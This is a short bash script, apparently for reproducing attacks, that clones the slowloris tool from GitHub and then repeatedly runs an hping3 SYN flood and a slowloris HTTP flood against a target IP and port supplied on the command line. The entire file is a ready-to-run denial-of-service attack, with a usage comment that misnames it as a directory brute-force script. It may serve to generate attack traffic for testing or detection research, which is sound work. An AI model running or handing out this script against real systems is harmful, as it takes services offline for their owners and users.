#!/bin/bash

#this scrip perform protocol dos and http dos using slowloris attack on the target system
# to use it just "./02_attack_reproduction_directorybrute.sh target_ip target_port"

#installing slowloris tools
rm -R /opt/slowloris/
git clone https://github.com/gkbrk/slowloris.git /opt/slowloris
n=0

while [ $n -lt 6 ];
do

        #echo "Normal Ping"
        #timeout 1m hping3 -S -p $2 $1

        echo "TCP Flood"
        timeout 3m hping3 -d 40000 -S -w 64 -p $2 --flood $1

        echo "HTTP Flood"
        timeout 3m python3 /opt/slowloris/slowloris.py 'http://'$1':'$2


        n=$(( $n+1 ))

done
